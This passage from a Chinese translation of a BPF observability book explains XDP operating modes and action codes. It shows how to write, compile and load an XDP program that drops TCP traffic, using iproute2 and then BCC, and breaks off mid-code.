title="操作模式"></a>操作模式</h4><p>XDP具有三种操作模式，以适应测试功能、供应商定制硬件以及无需定制硬件的常用构建内核。</p><h5 id="原生XDP"><a href="#原生XDP" class="headerlink" title="原生XDP"></a>原生XDP</h5><p>这是默认模式。在这种模式下，XDP BPF程序直接在网络驱动程序的接收路径之外运行。使用此模式时，请务必检查驱动程序是否支持。 您可以通过对给定内核版本的源代码树执行以下命令来检查：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# cd linux-4.18/</span><br><span class="line">[root@VM-16-14-centos linux-4.18]# git grep -l XDP_SETUP_PROG drivers/ </span><br><span class="line">drivers/net/ethernet/broadcom/bnxt/bnxt_xdp.c</span><br><span class="line">    drivers/net/ethernet/cavium/thunder/nicvf_main.c</span><br><span class="line">    drivers/net/ethernet/intel/i40e/i40e_main.c</span><br><span class="line">    drivers/net/ethernet/intel/ixgbe/ixgbe_main.c</span><br><span class="line">    drivers/net/ethernet/intel/ixgbevf/ixgbevf_main.c</span><br><span class="line">    drivers/net/ethernet/mellanox/mlx4/en_netdev.c</span><br><span class="line">    drivers/net/ethernet/mellanox/mlx5/core/en_main.c</span><br><span class="line">    drivers/net/ethernet/netronome/nfp/nfp_net_common.c</span><br><span class="line">    drivers/net/ethernet/qlogic/qede/qede_filter.c</span><br><span class="line">    drivers/net/netdevsim/bpf.c</span><br><span class="line">    drivers/net/tun.c</span><br><span class="line">    drivers/net/virtio_net.c</span><br></pre></td></tr></table></figure><p>可以看到，内核 4.18 支持以下内容：</p><ul><li>Broadcom NetXtreme-C/E network driver bnxt</li><li>Caviumthunderxdriver</li><li>Inteli40driver</li><li>Intelixgbeandixgvevfdrivers</li><li>Mellanoxmlx4andmlx5drivers</li><li>Netronome Network Flow Processor</li><li>QLogic qede NIC Driver</li><li>TUN/TAP</li><li>Virtio</li></ul><h5 id="卸载XDP"><a href="#卸载XDP" class="headerlink" title="卸载XDP"></a>卸载XDP</h5><p>在这种模式下，XDP BPF程序直接卸载到NIC中，而不是在主机CPU上执行。 通过将执行从CPU中推开，这种模式比原生XDP具有更高的性能提升。</p><p>通过在源码中查找<code>XDP_SETUP_PROG_HW</code>s来检查<code>4.18</code>中哪些NIC驱动程序支持硬件卸载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos linux-4.18]# git grep -l XDP_SETUP_PROG_HW drivers/</span><br><span class="line">include/linux/netdevice.h</span><br><span class="line">    866:    XDP_SETUP_PROG_HW,</span><br><span class="line">    net/core/dev.c</span><br><span class="line">    8001:           xdp.command = XDP_SETUP_PROG_HW;</span><br><span class="line">    drivers/net/netdevsim/bpf.c</span><br><span class="line">    200:    if (bpf-&gt;command == XDP_SETUP_PROG_HW &amp;&amp; !ns-&gt;bpf_xdpoffload_accept) &#123;</span><br><span class="line">    205:    if (bpf-&gt;command == XDP_SETUP_PROG_HW) &#123;</span><br><span class="line">    560:    case XDP_SETUP_PROG_HW:</span><br><span class="line">    drivers/net/ethernet/netronome/nfp/nfp_net_common.c</span><br><span class="line">    3476:   case XDP_SETUP_PROG_HW:</span><br></pre></td></tr></table></figure><p>这仅显示了<code>Netronome</code>网络流处理器(nfp)，意味着它还可以通过支持硬件卸载和本机XDP两种模式运行。</p><p>如果我没有网卡和驱动程序来尝试我的XDP程序时，我该怎么办？ 答案很简单，通用XDP！</p><h5 id="通用XDP"><a href="#通用XDP" class="headerlink" title="通用XDP"></a>通用XDP</h5><p>这是为想要编写和运行XDP程序但不具备本机或卸载XDP功能的开发人员提供的一种测试模式。从内核版本<code>4.12</code>开始支持通用XDP。例如可以在<code>veth</code>设备上使用此模式而无需购买特定的硬件来跟随。</p><p>但是谁是负责协调所有组件和操作模式的参与者呢？ 下一节我们将学习数据包处理器。</p><h4 id="数据包处理器"><a href="#数据包处理器" class="headerlink" title="数据包处理器"></a>数据包处理器</h4><p>XDP数据包处理器可以在XDP数据包上执行BPF程序并协调它们与网络堆栈之间的交互。数据包处理器是XDP程序的内核组件，它直接处理接收(RX)队列上的数据包，因为它们由NIC呈现。它确保数据包是可读和可写的，并允许以数据包处理器操作的形式附加后处理判决。可以在运行时完成对数据包处理器的原子程序更新和新程序加载，而不会在网络和相关流量方面造成任何服务中断。在运行时，XDP可以在“忙轮询”模式下使用，允许保留必须处理每个RX队列的CPU；这避免了上下文切换，并允许在到达时立即响应数据包，而不管IRQ亲缘关系如何。 XDP可以使用的另一种模式是“中断驱动”模式，另一方面，它不保留CPU，而是作为事件媒介的中断通知CPU必须处理新事件，同时仍可以做正常的处理。</p><p>在下图中可以看到RX/TX、应用程序、数据包处理器和应用于数据包的BPF程序之间的交互点。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/4.png" alt="4"></p><p>请注意在上图中有几个带有<code>XDP_</code>前缀的字符串方块。 这些是我们接下来介绍的XDP结果代码。</p><h5 id="XDP结果代码（数据包处理器操作）"><a href="#XDP结果代码（数据包处理器操作）" class="headerlink" title="XDP结果代码（数据包处理器操作）"></a>XDP结果代码（数据包处理器操作）</h5><p>在数据包处理器对数据包做出决定后，可以使用五个返回代码之一来表示，然后可以指示网络驱动程序如何处理数据包：</p><ul><li><p>DROP(XDP_DROP)</p><p>丢弃数据包。这发生在驱动程序中最早的RX阶段；丢弃一个数据包只是意味着将它回收到它刚刚“到达”的RX环形队列中。尽早丢弃数据包是缓解拒绝服务(DoS)的关键。这样，丢弃的数据包会使用尽可能少的CPU处理时间和功率。</p></li><li><p>Forward (XDP_TX)</p><p>转发数据包。 这可能发生在数据包被修改之前或之后。转发数据包意味着将接收到的数据包页面弹回它到达的同一个NIC。</p></li><li><p>Redirect (XDP_REDIRECT)</p><p>与<code>XDP_TX</code>类似，它能够传输XDP数据包，但它是通过另一个NIC或<code>BPF cpumap</code>来传输的。在<code>BPF cpumap</code>的情况下，在NIC的接收队列上为XDP服务的CPU可以继续这样做，并将用于处理上层内核堆栈的数据包推送到远程CPU。这类似于<code>XDP_PASS</code>，但XDP BPF程序可以继续为传入的高负载提供服务。</p></li><li><p>Pass（XDP_PASS)</p><p>将数据包传递给正常的网络堆栈进行处理。这相当于没有XDP的默认数据包处理行为。 通过以下两种方式之一完成：</p><ul><li>正常接收分配元数据（sk_buff），将数据包接收到堆栈上，并将数据包引导到另一个 CPU进行处理。 它允许用户空间的原始接口。 这可能发生在数据包被修改之前或之后。</li><li>通用接收卸载(GRO)可以接收大数据包并合并同一连接的数据包。GRO在处理后最终将数据包通过“正常接收”流程。</li></ul></li><li><p>Code error (XDP_ABORTED)</p><p>表示eBPF程序错误并导致数据包被丢弃。 它不是函数式程序应该用作返回码的东西。例如，如果程序除以零，将返回XDP_ABORTED。 XDP_ABORTED的值将始终为零。它通过 <code>trace_xdp_exception</code>跟踪点可以额外监视该跟踪点以检测不当行为。</p></li></ul><p>这些动作代码在<code>linux/bpf.h</code>头文件中表示如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> xdp_action &#123;</span><br><span class="line">        XDP_ABORTED = <span class="number">0</span>,</span><br><span class="line">        XDP_DROP,</span><br><span class="line">        XDP_PASS,</span><br><span class="line">        XDP_TX,</span><br><span class="line">        XDP_REDIRECT,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为XDP动作决定了不同的行为并且它是一种数据包处理器的内部机制，所以可以查看如下图的简化版本，仅关注返回动作。</p><p><img src="/2022/05/29/使用BPF的Linux可观测性-下篇-翻译/5.png" alt="5"></p><p>XDP程序的一个有趣之处在于，你通常不需要编写加载程序来加载它们。在大多数Linux机器中都有通过ip命令实现的比较好的加载程序。下一节将介绍如何使用它。</p><h4 id="XDP和iproute2作为加载器"><a href="#XDP和iproute2作为加载器" class="headerlink" title="XDP和iproute2作为加载器"></a>XDP和iproute2作为加载器</h4><p><code>iproute2</code>中可用的<code>ip</code>命令能够充当前端来加载编译成ELF文件的XDP程序，并且完全支持映射、映射重定位、尾调用和对象固定。</p><p>因为加载XDP程序可以表示为对现有网络接口的配置，所以加载程序作为<code>ip link</code>命令的一部分实现，该命令用于配置网络设备。</p><p>接下来让我们尝试一个例子</p><p>场景是我们有一个系统，在端口<code>8000</code>上有一个Web服务器，我们希望通过禁止所有 TCP 连接来阻止对其在服务器的面向公众的NIC上的任何页面的访问。</p><p>首先我们可以通过python起一个简单的服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><p>在网络服务器启动后，它的开放端口将显示在使用<code>ss</code>的开放套接字中。网络服务器绑定到任何接口 *:8000，因此到目前为止，任何可以访问我们公共接口的外部调用者都可以看到它的内容！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ss -tulpn</span><br><span class="line">Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   Process </span><br><span class="line">tcp     LISTEN   0        5                0.0.0.0:8000          0.0.0.0:*       users:(("python3",pid=5210,fd=3))</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">套接字统计信息，终端中的 ss，是一个命令行实用程序，用于调查 Linux 中的网络套接字。 它实际上是netstat 的现代版本，其用户体验类似于 Netstat，这意味着您可以传递相同的参数并获得可比较的结果。</span><br></pre></td></tr></table></figure><p>你可以使用<code>nmap</code>检查远程主机上的开放端口，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:18:26:89 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.16.14/22 brd 10.0.19.255 scope global noprefixroute eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe18:2689/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@VM-16-14-centos ~]# nmap -sS 10.0.16.14</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2022-06-02 12:45 CST</span><br><span class="line">Nmap scan report for 10.0.16.14</span><br><span class="line">Host is up (0.0000030s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">8000/tcp open  http-alt</span><br></pre></td></tr></table></figure><p>通过<code>nmap</code>可以看到<code>8000</code>端口，现在我们要封锁该端口</p><p>我们的程序将包含一个名为<code>program.c</code>的源文件，它需要使用IPv4 <code>iphdr</code>和以太网帧<code>ethhdr</code> 标头结构以及协议常量和其他结构。 让我们包含所需的标题，如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>包含头文件后，我们可以使用在前面章节中已经遇到的SEC宏，用于声明ELF属性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br></pre></td></tr></table></figure><p>现在我们可以声明程序的主入口点<code>myprogram</code>及ELF节名称<code>mysection</code>。 我们的程序将<code>xdp_md</code>结构指针作为输入上下文，它是驱动程序内<code>xdp_buff</code>的BPF等价物。 通过使用它作为上下文，我们定义接下来将使用的变量，例如数据指针、以太网和IP层结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SEC(<span class="string">"mysection"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br></pre></td></tr></table></figure><p>因为数据包含以太网帧，我们现在可以从中提取IPv4层。我们还检查IPv4层的偏移量是否不超过整个指针空间，以便能够通过静态验证器。当超出地址空间时，我们会丢弃数据包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">ip = data + ipsize;</span><br><span class="line">ipsize += <span class="keyword">sizeof</span>(struct iphdr); </span><br><span class="line"><span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line"><span class="keyword">return</span> XDP_DROP; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在所有的验证和设置之后，我们可以实现程序的真正逻辑，它基本上丢弃每个TCP数据包，同时允许其他任何东西：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123; </span><br><span class="line">  <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> XDP_PASS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们的程序就完成了，<code>program.c</code>完整程序代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SEC(NAME) __attribute__((section(NAME), used))</span></span><br><span class="line"></span><br><span class="line">SEC(<span class="string">"mysection"</span>)</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下一步是使用<code>Clang</code>从我们的程序中编译出ELF文件<code>program.o</code>。我们可以在目标机器之外执行此编译步骤，因为<code>BPF ELF</code>二进制文件不依赖于平台，对<code>program.c</code>编译如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt7]# clang -g -c -O2 -target bpf -c program.c -o program.o</span><br></pre></td></tr></table></figure><p>现在我们可以使用ip实用程序和set命令将<code>program.o</code>加载到公共网络接口eth0上，加载XDP程序的语法很简单：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt7]# ip link set dev eth0 xdp obj program.o sec mysection</span><br></pre></td></tr></table></figure><p>对上述命令的分析如下</p><p>ip：调用ip命令</p><p>link：配置网络接口</p><p>set：更改设备属性</p><p>dev eth0：指定我们要在其上操作和加载XDP程序的网络设备</p><p>xdp obj program.o：从名为<code>program.o</code>的ELF文件（对象）加载XDP程序。 此命令的xdp部分告诉系统在可用时使用本机驱动程序，否则回退到通用驱动程序。你可以通过使用更具体的选择器来强制使用一种或另一种模式：</p><ul><li>xdpgeneric to use generic XDP</li><li>xdpdrv to use native XDP</li><li>xdpoffload to use offloaded XDP</li></ul><p>sec mysection：指定包含要从ELF文件中使用的BPF程序的节名<code>mysection</code>； 如果未指定，将使用名为<code>prog</code>的部分。 如果程序中未指定任何部分，则必须在ip调用中指定sec <code>.text</code>。</p><p>在这个阶段，如果该命令返回零作为退出代码且没有错误，我们可以检查网络接口以查看程序是否已正确加载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ip a show eth0</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 xdpgeneric/id:32 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 52:54:00:18:26:89 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.0.16.14/22 brd 10.0.19.255 scope global noprefixroute eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe18:2689/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure><p>通过<code>ip a</code>输出了新的细节；在MTU后面显示<code>xdpgeneric/id:32</code>，它显示了两个有趣的信息：</p><ul><li>曾经使用过的驱动，xdpgeneric</li><li>XDP程序的ID，32</li></ul><p>最后一步是验证加载的程序是否确实在做它应该做的事情。我们可以通过在外部机器上再次执行<code>nmap</code>来观察端口8000不再可访问来验证这一点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# nmap -sS 10.0.16.14</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2022-06-02 13:10 CST</span><br><span class="line">Nmap scan report for 10.0.16.14</span><br><span class="line">Host is up (0.0000030s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br></pre></td></tr></table></figure><p>另一个验证它是否正常工作的测试是尝试通过浏览器访问程序或执行任何HTTP请求。 以<code>10.0.16.14</code>为目标时，任何类型的测试都应该失败。 这样我们就成功加在了第一个XDP程序！</p><p>如果您在需要恢复到原始状态的机器上执行了所有这些步骤，则可以随时分离程序并关闭设备的XDP：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> ip link <span class="built_in">set</span> dev eth0 xdp off</span></span><br></pre></td></tr></table></figure><p>在使用<code>iproute2</code>作为加载器时可以跳过自己编写加载器的部分。在这个例子中，我们的重点是<code>iproute2</code>，它已经为XDP程序实现了一个加载器。这些程序实际上是BPF程序，因此即使<code>iproute2</code>有时很方便，你可以使用 BCC 加载程序，例如在下一节你可以直接使用bpf系统调用。拥有自定义加载器的优点是允许管理程序的生命周期及其与用户空间的交互。</p><h4 id="XDP和BCC"><a href="#XDP和BCC" class="headerlink" title="XDP和BCC"></a>XDP和BCC</h4><p>与其他BPF程序一样，可以使用BCC编译、加载和运行XDP程序。 接下来的示例显示了一个XDP程序，它与我们用于<code>iproute2</code>的程序类似，但它具有BCC制作的自定义用户空间加载程序。在这种情况下需要加载程序是因为要计算在丢弃TCP数据包时遇到的数据包数量。</p><p>首先还是创建一个名为<code>program.c</code>的内核空间程序。</p><p>在<code>iproute2</code>示例中，我们的程序需要为与BPF和协议相关的结构和函数定义导入所需的头文件。这里我们做同样的事情，但我们还使用<code>BPF_TABLE</code>宏声明了<code>BPF_MAP_TYPE_PERCPU_ARRAY</code>类型的映射。 该映射将包含每个IP协议索引的数据包计数器，这就是大小为256的原因（IP规范仅包含256个值）。 我们想使用<code>BPF_MAP_TYPE_PERCPU_ARRAY</code>类型，因为它可以保证CPU级别的计数器的原子性：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"program"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line">BPF_TABLE(<span class="string">"percpu_array"</span>, <span class="keyword">uint32_t</span>, <span class="keyword">long</span>, packetcnt, <span class="number">256</span>);</span><br></pre></td></tr></table></figure><p>之后声明主函数<code>myprogram</code>，它将<code>xdp_md</code>结构作为参数。 首先需要包含的是以太网IPv4帧的变量声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line"><span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span> <span class="keyword">long</span> *cnt;</span><br><span class="line">__u32 idx;</span><br><span class="line">ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">ip = data + ipsize;</span><br><span class="line">ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br></pre></td></tr></table></figure><p>在我们完成所有变量声明并且可以访问包含以太网帧的数据指针和带有IPv4数据包的ip指针之后，我们可以检查内存空间是否超出范围。 如果是，我们丢弃数据包。 如果内存空间没问题，我们提取协议并查找<code>packetcnt</code>数组以获取变量<code>idx</code>中当前协议的数据包计数器的先前值。然后将计数器加一。处理完增量后，我们可以继续检查协议是否为TCP。 如果是，我们就直接丢弃数据包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data + ipsize &gt; data_end) &#123; </span><br><span class="line">  <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line">idx = ip-&gt;protocol;</span><br><span class="line">cnt = packetcnt.lookup(&amp;idx); </span><br><span class="line"><span class="keyword">if</span> (cnt) &#123;</span><br><span class="line">*cnt += <span class="number">1</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123; </span><br><span class="line">  <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> XDP_PASS; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>program.c</code>完整程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"program"</span></span></span><br><span class="line"><span 